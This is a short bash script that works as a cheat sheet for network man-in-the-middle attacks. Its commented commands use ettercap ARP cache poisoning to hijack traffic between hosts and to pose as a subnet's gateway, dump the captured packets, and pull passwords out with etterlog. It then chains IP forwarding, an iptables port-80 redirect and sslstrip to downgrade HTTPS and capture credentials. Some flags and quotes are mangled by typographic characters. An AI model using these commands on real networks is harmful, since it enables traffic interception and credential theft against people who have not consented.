#!/bin/bash

ettercap -Tq -I
# List interfaces

ettercap -Tq -i eth0 -M arp:remote /target-range1/ /target-range2/ 
# The packets between target-range1 and target-range will be hijacked and they will be going through our machine (magic of arp-cache-poisoning)

ettercap -Tq -i eth0 -M arp:remote /172.16.0.1//
# Become the gateway for all machines in a subnet

ettercap -Tq -L dump -i eth0
# Creates two packet dump files, dump.eci and dump.ecp

etterlog dump.eci
# Displays connection details of dumped packets 

etterlog -p dump.eci
# Displays the passwords captured, if any

echo “1” > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 10000
sslstrip -l 10000 # https://github.com/moxie0/sslstrip
ettercap -T -q -M ARP /// /// -i eth0 -L log
etterlog -p dump.eci
# SSlStrips packets and then captures the data before sending it to its intended recepient